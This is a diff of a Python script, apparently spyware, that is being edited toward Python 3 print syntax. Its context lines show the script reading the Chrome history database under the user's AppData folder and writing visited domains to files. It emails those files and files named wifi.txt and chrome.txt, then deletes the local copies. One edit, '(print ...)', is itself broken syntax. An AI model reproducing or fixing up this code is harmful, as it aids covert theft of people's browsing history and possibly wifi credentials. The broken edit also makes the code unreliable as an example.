@@ -49,7 +49,7 @@ def history():
                    domain = sublevel_split[0].replace("www.", "")
                    return domain
            except IndexError:
-                   print "URL format error!"
+                   (print "URL format error!")
 
    def analyze(results):
       b=open("chrome1.txt","w")
@@ -58,6 +58,7 @@ def history():
          b.write(site + "\n")
 #path to user's history database (Chrome)
       b.close()
+   #Dont working
    data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
    files = os.listdir(data_path)
    history_db = os.path.join(data_path, 'history')
@@ -144,7 +145,7 @@ try:
    fo.close()
    os.remove("wifi.txt")
 except Exception:
-   print "Error: unable to send email"
+   print ("Error: unable to send email")
 #################################################
 filename = "chrome1.txt"
 fo1 = open(filename, "rb")
@@ -188,7 +189,7 @@ try:
    fo1.close()
    os.remove("chrome1.txt")
 except Exception:
-   print "Error: unable to send email"
+   print ("Error: unable to send email")
 ###########################################
 filename = "chrome.txt"
 fo = open(filename, "rb")
@@ -242,5 +243,5 @@ try:
    fo.close()
    os.remove("chrome.txt")
 except Exception:
-   print "Error: unable to send email"
+   print ("Error: unable to send email")
    
